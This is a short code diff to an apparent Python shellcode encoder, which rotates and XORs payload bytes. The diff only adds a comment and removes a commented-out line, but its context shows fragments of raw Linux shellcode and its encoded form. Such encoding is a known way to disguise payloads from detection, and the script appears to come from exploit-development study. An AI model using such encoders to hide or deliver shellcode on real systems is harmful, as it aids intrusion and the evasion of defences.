@@ -16,6 +16,7 @@ shellcode_decoded = (
     "\x89\xe3\x89\xca\xcd\x80"
 )
 
+# Encoded Shellcode
 shellcode_encoded = (
     "\x12\x3e\x54\x79\x66\x75\x52\xba"
     "\xba\x31\x52\x52\xba\x13\x72\x92"
@@ -45,7 +46,6 @@ def rol_xor_encoder(r_bits, max_bits, xor_value):
     for x in bytearray(shellcode_decoded):
         # ROL and XOR
         encoded = rol(x, r_bits, max_bits) ^ xor_value
-        #encoded = x ^ xor_value
 
         encoded_hex += '\\x'
         encoded_hex += '%02x' % (encoded & 0xff)
